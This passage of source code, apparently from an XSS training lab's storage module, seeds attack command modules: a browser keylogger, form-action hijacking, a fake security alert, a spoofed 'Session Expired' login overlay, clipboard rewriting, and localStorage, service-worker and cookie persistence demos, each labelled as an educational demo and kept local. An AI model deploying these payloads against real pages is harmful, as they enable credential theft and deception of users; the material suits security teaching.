        description: 'List all network interfaces available in the browser',
        category: 'Network Detection',
        icon: 'wifi',
        code: `
          (() => {
            // Educational demonstration only
            return {
              message: 'For security reasons, browsers restrict access to network interface information.',
              note: 'This command demonstrates information that could be collected in certain contexts.',
              simulatedData: {
                online: navigator.onLine,
                type: 'Simulated WiFi',
                ip: '192.168.1.X (simulated for demo)',
                speed: '100 Mbps (simulated for demo)'
              }
            };
          })();
        `
      },
      {
        name: 'Detect Forms',
        description: 'Detect all forms on the current page',
        category: 'Form Manipulation',
        icon: 'dynamic_form',
        code: `
          (() => {
            // Educational demonstration only
            const forms = document.forms;
            const formInfo = [];
            
            for (let i = 0; i < forms.length; i++) {
              const form = forms[i];
              const fields = [];
              
              for (let j = 0; j < form.elements.length; j++) {
                const element = form.elements[j];
                if (element.tagName === 'INPUT' || element.tagName === 'SELECT' || element.tagName === 'TEXTAREA') {
                  fields.push({
                    type: element.type || element.tagName.toLowerCase(),
                    name: element.name,
                    id: element.id,
                    value: element.type === 'password' ? '******' : element.value
                  });
                }
              }
              
              formInfo.push({
                id: form.id,
                name: form.name,
                action: form.action,
                method: form.method,
                fields: fields
              });
            }
            
            return { forms: formInfo };
          })();
        `
      },
      {
        name: 'Create Keylogger',
        description: 'Demonstrate a keylogger for educational purposes',
        category: 'Form Manipulation',
        icon: 'dynamic_form',
        code: `
          (() => {
            // Educational demonstration only
            // NOTE: This is for educational purposes to show how keyloggers work
            // No actual data is being collected or sent anywhere
            
            window.xssLabKeyLogger = {
              keys: [],
              active: true,
              maxKeys: 10, // Only record 10 keys for demonstration
              handler: function(e) {
                if (!window.xssLabKeyLogger.active) return;
                
                // Don't log Ctrl, Alt, Shift, etc.
                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
                  const keyInfo = {
                    key: e.key,
                    target: e.target.nodeName + (e.target.id ? '#' + e.target.id : '') + (e.target.name ? '[name=' + e.target.name + ']' : '')
                  };
                  
                  window.xssLabKeyLogger.keys.push(keyInfo);
                  
                  // Limit recorded keys for demo
                  if (window.xssLabKeyLogger.keys.length > window.xssLabKeyLogger.maxKeys) {
                    window.xssLabKeyLogger.active = false;
                    document.removeEventListener('keydown', window.xssLabKeyLogger.handler);
                  }
                }
              }
            };
            
            // Start logging
            document.addEventListener('keydown', window.xssLabKeyLogger.handler);
            
            // Display demo banner
            const banner = document.createElement('div');
            banner.style.position = 'fixed';
            banner.style.bottom = '0';
            banner.style.left = '0';
            banner.style.width = '100%';
            banner.style.padding = '10px';
            banner.style.backgroundColor = '#f8d7da';
            banner.style.color = '#721c24';
            banner.style.textAlign = 'center';
            banner.style.zIndex = '9999';
            banner.style.fontFamily = 'Arial, sans-serif';
            banner.innerHTML = 'EDUCATIONAL DEMO: Keylogging demonstration active. The next 10 keys will be recorded locally (nothing is sent to a server).';
            document.body.appendChild(banner);
            
            return { 
              success: true, 
              message: 'Keylogger demonstration initialized. Type a few keys then run "Get Keylogger Data" command.' 
            };
          })();
        `
      },
      {
        name: 'Modify Form Action',
        description: 'Change a form submission endpoint for demonstration',
        category: 'Form Manipulation',
        icon: 'dynamic_form',
        code: `
          (() => {
            // Educational demonstration only
            const forms = document.forms;
            const results = [];
            
            if (forms.length === 0) {
              return { message: 'No forms found on this page' };
            }
            
            for (let i = 0; i < forms.length; i++) {
              const form = forms[i];
              const originalAction = form.action;
              
              // Save original action for restoration
              form.setAttribute('data-original-action', originalAction);
              
              // Change action to demo endpoint (this doesn't actually submit anywhere)
              form.action = 'javascript:alert("Form submission intercepted for educational demonstration")';
              
              results.push({
                formId: form.id || "form_" + i,
                originalAction: originalAction,
                newAction: form.action
              });
              
              // Add visual indicator
              const notice = document.createElement('div');
              notice.style.padding = '5px';
              notice.style.margin = '5px 0';
              notice.style.backgroundColor = '#fff3cd';
              notice.style.color = '#856404';
              notice.style.borderRadius = '4px';
              notice.innerHTML = 'This form has been modified for XSS demonstration purposes';
              form.prepend(notice);
            }
            
            return { 
              success: true, 
              message: 'Form actions modified for demonstration', 
              forms: results 
            };
          })();
        `
      },
      {
        name: 'Create Fake Alert',
        description: 'Display a fake system or browser alert',
        category: 'Social Engineering',
        icon: 'psychology',
        code: `
          (() => {
            // Educational demonstration only
            // Create the fake alert div
            const fakeAlert = document.createElement('div');
            fakeAlert.id = 'fake-browser-alert';
            fakeAlert.style.position = 'fixed';
            fakeAlert.style.top = '0';
            fakeAlert.style.left = '0';
            fakeAlert.style.width = '100%';
            fakeAlert.style.height = '100%';
            fakeAlert.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
            fakeAlert.style.zIndex = '9999';
            fakeAlert.style.display = 'flex';
            fakeAlert.style.alignItems = 'center';
            fakeAlert.style.justifyContent = 'center';
            
            // Create the alert content
            const alertContent = document.createElement('div');
            alertContent.style.width = '400px';
            alertContent.style.backgroundColor = 'white';
            alertContent.style.borderRadius = '8px';
            alertContent.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
            alertContent.style.fontFamily = 'Arial, sans-serif';
            alertContent.style.overflow = 'hidden';
            
            // Header
            const header = document.createElement('div');
            header.style.backgroundColor = '#f44336';
            header.style.color = 'white';
            header.style.padding = '12px 16px';
            header.style.display = 'flex';
            header.style.alignItems = 'center';
            header.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span style="margin-left: 8px; font-weight: bold;">Security Alert</span>';
            
            // Body
            const body = document.createElement('div');
            body.style.padding = '16px';
            body.innerHTML = '<p style="margin-top: 0;">For your security, your browser needs to be updated immediately. Critical vulnerability CVE-2023-XXXXX has been detected.</p>' + 
              '<p><strong>EDUCATIONAL NOTICE:</strong> This is a fake alert created for educational purposes to demonstrate social engineering techniques. A real attack might try to trick you into downloading malware or giving away personal information.</p>';
            
            // Footer
            const footer = document.createElement('div');
            footer.style.padding = '12px 16px';
            footer.style.borderTop = '1px solid #eee';
            footer.style.display = 'flex';
            footer.style.justifyContent = 'flex-end';
            
            const closeButton = document.createElement('button');
            closeButton.textContent = 'Close Demo';
            closeButton.style.padding = '8px 16px';
            closeButton.style.backgroundColor = '#f44336';
            closeButton.style.color = 'white';
            closeButton.style.border = 'none';
            closeButton.style.borderRadius = '4px';
            closeButton.style.cursor = 'pointer';
            closeButton.onclick = function() {
              document.body.removeChild(fakeAlert);
            };
            
            footer.appendChild(closeButton);
            
            // Assemble the parts
            alertContent.appendChild(header);
            alertContent.appendChild(body);
            alertContent.appendChild(footer);
            fakeAlert.appendChild(alertContent);
            
            // Add to document
            document.body.appendChild(fakeAlert);
            
            return { success: true, message: 'Fake alert displayed' };
          })();
        `
      },
      {
        name: 'Spoof Login Form',
        description: 'Create a fake login overlay for demonstration',
        category: 'Social Engineering',
        icon: 'psychology',
        code: `
          (() => {
            // Educational demonstration only
            // Create the container
            const overlay = document.createElement('div');
            overlay.id = 'demo-fake-login';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
            overlay.style.zIndex = '9999';
            overlay.style.display = 'flex';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.style.fontFamily = 'Arial, sans-serif';
            
            // Create the form container
            const formBox = document.createElement('div');
            formBox.style.width = '360px';
            formBox.style.backgroundColor = 'white';
            formBox.style.borderRadius = '8px';
            formBox.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
            formBox.style.overflow = 'hidden';
            
            // Form content
            formBox.innerHTML = \`
              <div style="padding: 20px; text-align: center; border-bottom: 1px solid #eee;">
                <h2 style="margin: 0; color: #333; font-size: 18px;">Session Expired</h2>
                <p style="margin: 10px 0 0; color: #666; font-size: 14px;">Please re-enter your credentials to continue</p>
              </div>
              <div style="padding: 20px;">
                <form id="fake-login-form" style="margin: 0;">
                  <div style="margin-bottom: 15px;">
                    <label for="fake-email" style="display: block; margin-bottom: 5px; font-size: 14px; color: #333;">Email</label>
                    <input type="email" id="fake-email" name="email" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px;">
                  </div>
                  <div style="margin-bottom: 20px;">
                    <label for="fake-password" style="display: block; margin-bottom: 5px; font-size: 14px; color: #333;">Password</label>
                    <input type="password" id="fake-password" name="password" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px;">
                  </div>
                  <div style="margin-bottom: 15px; text-align: center;">
                    <button type="button" id="fake-login-button" style="background-color: #1a73e8; color: white; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; cursor: pointer; width: 100%;">Sign In</button>
                  </div>
                </form>
              </div>
              <div style="padding: 15px; background-color: #f8f9fa; text-align: center; font-size: 12px;">
                <p style="margin: 0; color: #d32f2f; font-weight: bold;">EDUCATIONAL DEMO: This is a fake login form created for demonstration purposes.</p>
                <p style="margin: 5px 0 0; color: #333;">A real attack would steal your credentials.</p>
                <button id="fake-login-close" style="margin-top: 10px; background-color: #d32f2f; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;">Close Demonstration</button>
              </div>
            \`;
            
            overlay.appendChild(formBox);
            document.body.appendChild(overlay);
            
            // Add event listeners
            document.getElementById('fake-login-close').addEventListener('click', function() {
              document.body.removeChild(overlay);
            });
            
            document.getElementById('fake-login-button').addEventListener('click', function() {
              alert('EDUCATIONAL DEMO: In a real attack, your credentials would have been stolen. Always verify the URL and look for HTTPS before entering credentials.');
              document.body.removeChild(overlay);
            });
            
            return { success: true, message: 'Fake login form displayed for educational purposes' };
          })();
        `
      },
      {
        name: 'Clipboard Manipulation',
        description: 'Demonstrate clipboard manipulation techniques',
        category: 'Social Engineering',
        icon: 'psychology',
        code: `
          (() => {
            // Educational demonstration only
            // Create notification banner
            const banner = document.createElement('div');
            banner.style.position = 'fixed';
            banner.style.top = '0';
            banner.style.left = '0';
            banner.style.width = '100%';
            banner.style.padding = '12px';
            banner.style.backgroundColor = '#f8d7da';
            banner.style.color = '#721c24';
            banner.style.textAlign = 'center';
            banner.style.zIndex = '9999';
            banner.style.fontFamily = 'Arial, sans-serif';
            banner.style.boxShadow = '0 2px 4px rgba(0,0,0,0.2)';
            banner.innerHTML = '<strong>Educational Demo:</strong> This page will ask for clipboard permission for demonstration purposes. Try copying text after allowing.';
            document.body.appendChild(banner);
            
            // Add copy event listener
            document.addEventListener('copy', function(e) {
              // Original text being copied
              const originalText = window.getSelection().toString();
              
              if (originalText.trim().length > 0) {
                // Modify clipboard data for demonstration
                e.clipboardData.setData('text/plain', originalText + '\\n\\n[EDUCATIONAL DEMO: This text was modified when you copied it. Attackers could modify Bitcoin addresses, URLs, etc.]');
                e.preventDefault();
                
                // Show notification
                alert('EDUCATIONAL DEMO: The text you copied was modified! This demonstrates how XSS can be used to manipulate clipboard content.');
              }
            });
            
            // Demo instructions
            setTimeout(() => {
              const instructions = document.createElement('div');
              instructions.style.position = 'fixed';
              instructions.style.bottom = '20px';
              instructions.style.right = '20px';
              instructions.style.width = '300px';
              instructions.style.padding = '15px';
              instructions.style.backgroundColor = 'white';
              instructions.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
              instructions.style.borderRadius = '8px';
              instructions.style.zIndex = '9998';
              instructions.style.fontFamily = 'Arial, sans-serif';
              instructions.innerHTML = '<h3 style="margin-top:0;color:#333">Demo Instructions</h3>' +
                '<p style="margin-bottom:10px">1. Try selecting and copying some text on this page</p>' +
                '<p style="margin-bottom:10px">2. Paste it somewhere to see the modification</p>' +
                '<button id="close-clipboard-demo" style="background:#f44336;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;">Close Demo</button>';
              document.body.appendChild(instructions);
              
              document.getElementById('close-clipboard-demo').addEventListener('click', function() {
                document.body.removeChild(banner);
                document.body.removeChild(instructions);
              });
            }, 1000);
            
            return { success: true, message: 'Clipboard manipulation demo initialized' };
          })();
        `
      },
      {
        name: 'LocalStorage Hook',
        description: 'Demonstrate localStorage persistence techniques',
        category: 'Persistence Techniques',
        icon: 'cached',
        code: `
          (() => {
            // Educational demonstration only
            // Create a hook that persists in localStorage
            const hookCode = \`
              // This is a simulated hook that would reconnect to the C2 server
              console.log('[EDUCATIONAL DEMO] Persistence hook executed');
              
              // In a real attack, this would load a remote script
              const mockReconnect = () => {
                // Simulate reconnection logic
                console.log('[EDUCATIONAL DEMO] Mock reconnection to C2 server');
              };
              
              // Execute the reconnection
              mockReconnect();
            \`;
            
            // Store the hook code
            localStorage.setItem('xss_lab_demo_hook', hookCode);
            
            // Demo execution - THIS DOES NOT ACTUALLY CREATE PERSISTENCE
            // In a real attack, the code would set up event listeners or intervals to execute the hook
            const demoDiv = document.createElement('div');
            demoDiv.style.position = 'fixed';
            demoDiv.style.bottom = '10px';
            demoDiv.style.left = '10px';
            demoDiv.style.right = '10px';
            demoDiv.style.padding = '10px';
            demoDiv.style.backgroundColor = '#f8f9fa';
            demoDiv.style.border = '1px solid #ddd';
            demoDiv.style.borderRadius = '4px';
            demoDiv.style.zIndex = '9999';
            demoDiv.style.fontFamily = 'Arial, sans-serif';
            
            demoDiv.innerHTML = \`
              <h3 style="margin-top:0;color:#d32f2f">Educational Persistence Demo</h3>
              <p>A hook has been stored in localStorage (but not activated) as a demonstration. In a real attack, this could be used to maintain access across page refreshes.</p>
              <div style="margin: 10px 0; padding: 10px; background-color: #f5f5f5; border-radius: 4px; overflow: auto;">
                <pre style="margin: 0; font-family: monospace; font-size: 12px;">// This is a simulated hook that would reconnect to the C2 server
console.log('[EDUCATIONAL DEMO] Persistence hook executed');

// In a real attack, this would load a remote script
const mockReconnect = () => {
  // Simulate reconnection logic
  console.log('[EDUCATIONAL DEMO] Mock reconnection to C2 server');
};

// Execute the reconnection
mockReconnect();</pre>
              </div>
              <div style="display: flex; justify-content: space-between;">
                <button id="demo-execute-hook" style="background-color: #ff9800; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;">Simulate Hook Execution</button>
                <button id="demo-remove-hook" style="background-color: #4caf50; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;">Remove Hook & Close Demo</button>
              </div>
            \`;
            
            document.body.appendChild(demoDiv);
            
            // Add event listeners for demo buttons
            document.getElementById('demo-execute-hook').addEventListener('click', function() {
              console.log('[EDUCATIONAL DEMO] Hook execution simulation');
              alert('EDUCATIONAL DEMO: In a real attack, the persistent hook would execute now. Check the console for simulation messages.');
              
              // This is just a simulation - it doesn't actually execute remote code
              console.log('[EDUCATIONAL DEMO] Simulated hook execution:');
              console.log(localStorage.getItem('xss_lab_demo_hook'));
            });
            
            document.getElementById('demo-remove-hook').addEventListener('click', function() {
              localStorage.removeItem('xss_lab_demo_hook');
              document.body.removeChild(demoDiv);
              alert('Hook removed from localStorage and demo closed.');
            });
            
            return { 
              success: true, 
              message: 'LocalStorage hook created for demonstration purposes',
              note: 'This is an educational demonstration only and does not create actual persistence.'
            };
          })();
        `
      },
      {
        name: 'Service Worker Demo',
        description: 'Educational demo of service worker persistence',
        category: 'Persistence Techniques',
        icon: 'cached',
        code: `
          (() => {
            // Educational demonstration only
            // This does NOT actually register a malicious service worker
            
            // Create demo notification
            const notificationDiv = document.createElement('div');
            notificationDiv.style.position = 'fixed';
            notificationDiv.style.top = '10px';
            notificationDiv.style.left = '10px';
            notificationDiv.style.right = '10px';
            notificationDiv.style.padding = '15px';
            notificationDiv.style.backgroundColor = '#fff3cd';
            notificationDiv.style.color = '#856404';
            notificationDiv.style.borderRadius = '4px';
            notificationDiv.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
            notificationDiv.style.zIndex = '9999';
            notificationDiv.style.fontFamily = 'Arial, sans-serif';
            
            // Service worker demo code (not actually registered)
            const serviceWorkerCode = \`
              // This is what a malicious service worker might contain
              self.addEventListener('fetch', event => {
                // Intercept network requests
                console.log('Intercepted request:', event.request.url);
                
                // In a real attack, the service worker could:
                // 1. Modify responses (e.g., inject scripts into HTML)
                // 2. Steal credentials from requests
                // 3. Cache malicious content
                // 4. Create backdoor access
                
                // Normal service worker would use event.respondWith() here
              });
              
              self.addEventListener('activate', event => {
                console.log('Malicious service worker activated');
              });
            \`;
            
            notificationDiv.innerHTML = \`
              <h3 style="margin-top:0;margin-bottom:10px;">Service Worker Persistence Demonstration</h3>
              <p style="margin-bottom:10px;">In a real attack, a service worker could be registered to maintain persistence even after the browser is closed and reopened.</p>
              <div style="background-color:#f8f9fa;border:1px solid #eee;border-radius:4px;padding:10px;margin-bottom:10px;overflow:auto;">
                <pre style="margin:0;font-family:monospace;font-size:12px;white-space:pre-wrap;">// This is what a malicious service worker might contain
self.addEventListener('fetch', event => {
  // Intercept network requests
  console.log('Intercepted request:', event.request.url);
  
  // In a real attack, the service worker could:
  // 1. Modify responses (e.g., inject scripts into HTML)
  // 2. Steal credentials from requests
  // 3. Cache malicious content
  // 4. Create backdoor access
  
  // Normal service worker would use event.respondWith() here
});

self.addEventListener('activate', event => {
  console.log('Service worker activated');
});</pre>
              </div>
              <p style="margin-bottom:10px;font-weight:bold;color:#d32f2f;">EDUCATIONAL NOTE: No actual service worker has been registered. This is only a demonstration of the technique.</p>
              <div style="text-align:right;">
                <button id="close-sw-demo" style="background-color:#6c757d;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;">Close Demonstration</button>
              </div>
            \`;
            
            document.body.appendChild(notificationDiv);
            
            // Add event listener to close button
            document.getElementById('close-sw-demo').addEventListener('click', function() {
              document.body.removeChild(notificationDiv);
            });
            
            return { 
              success: true, 
              message: 'Service Worker persistence demonstration displayed',
              note: 'No actual service worker was registered. This is for educational purposes only.'
            };
          })();
        `
      },
      {
        name: 'Cookie-based Hook',
        description: 'Demonstrate cookie-based persistence',
        category: 'Persistence Techniques',
        icon: 'cached',
        code: `
          (() => {
            // Educational demonstration only
            // Create a demonstration of cookie-based persistence
            
            // Create a session cookie that expires when browser is closed
            document.cookie = 'xss_lab_demo=1; path=/';
            
            // Create a persistent cookie that would survive browser restarts
            const expirationDate = new Date();
            expirationDate.setDate(expirationDate.getDate() + 7); // 7 days
            document.cookie = \`xss_lab_persistent_demo=1; path=/; expires=\${expirationDate.toUTCString()}\`;
            
            // Display demo notification
            const demoDiv = document.createElement('div');
            demoDiv.style.position = 'fixed';
            demoDiv.style.bottom = '20px';
            demoDiv.style.left = '20px';
            demoDiv.style.width = '400px';
            demoDiv.style.padding = '15px';
            demoDiv.style.backgroundColor = '#e8f4fd';
            demoDiv.style.border = '1px solid #b8daff';
            demoDiv.style.borderRadius = '8px';
            demoDiv.style.boxShadow = '0 2px 10px rgba(0,0,0,0.1)';
            demoDiv.style.zIndex = '9999';
            demoDiv.style.fontFamily = 'Arial, sans-serif';
            
            // List all cookies
            const allCookies = document.cookie.split('; ').map(cookie => {
              const [name, value] = cookie.split('=');
              return { name, value };
            });
            
            demoDiv.innerHTML = \`
              <h3 style="margin-top:0;color:#0c5460;margin-bottom:10px;">Cookie-based Persistence Demo</h3>
              <p style="margin-bottom:10px;">Created cookies for demonstration:</p>
              <ul style="margin-bottom:15px;padding-left:20px;">
                <li><strong>Session Cookie:</strong> xss_lab_demo=1 (expires when browser closes)</li>
                <li><strong>Persistent Cookie:</strong> xss_lab_persistent_demo=1 (expires in 7 days)</li>
              </ul>
              
              <div style="margin-bottom:15px;">
                <h4 style="margin-top:0;margin-bottom:5px;color:#0c5460;">All Current Cookies:</h4>
                <div style="background-color:#f8f9fa;border:1px solid #eee;border-radius:4px;padding:10px;max-height:100px;overflow:auto;">
                  <pre style="margin:0;font-family:monospace;font-size:12px;">[
  { "name": "xss_lab_demo", "value": "1" },
  { "name": "xss_lab_persistent_demo", "value": "1" }
]</pre>
                </div>
              </div>
              
              <p style="color:#721c24;background-color:#f8d7da;padding:8px;border-radius:4px;margin-bottom:10px;">
                <strong>Educational Note:</strong> In a real attack, these cookies could contain tracking IDs or even JavaScript that would execute when read by vulnerable applications.
              </p>
              
              <div style="display:flex;justify-content:space-between;">
                <button id="remove-demo-cookies" style="background-color:#28a745;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;">Remove Demo Cookies</button>
                <button id="close-cookie-demo" style="background-color:#6c757d;color:white;border:none;padding:8px 12px;border-radius:4px;cursor:pointer;">Close Demo</button>
              </div>
            \`;
            
            document.body.appendChild(demoDiv);
            
            // Add event listeners
            document.getElementById('remove-demo-cookies').addEventListener('click', function() {
              // Delete the demo cookies
              document.cookie = 'xss_lab_demo=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';
              document.cookie = 'xss_lab_persistent_demo=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';
              alert('Demo cookies have been removed!');
            });
            
            document.getElementById('close-cookie-demo').addEventListener('click', function() {
              document.body.removeChild(demoDiv);
            });
            
            return { 
              success: true, 
              message: 'Cookie-based persistence demonstration displayed',
              cookies: [
                { name: "xss_lab_demo", value: "1" },
                { name: "xss_lab_persistent_demo", value: "1" }
              ]
            };
          })();
        `
      }
    ];
    
    // Insert default modules
    defaultModules.forEach(async (module) => {
      await this.createCommandModule(module);
    });
  }
}

export const storage = new MemStorage();
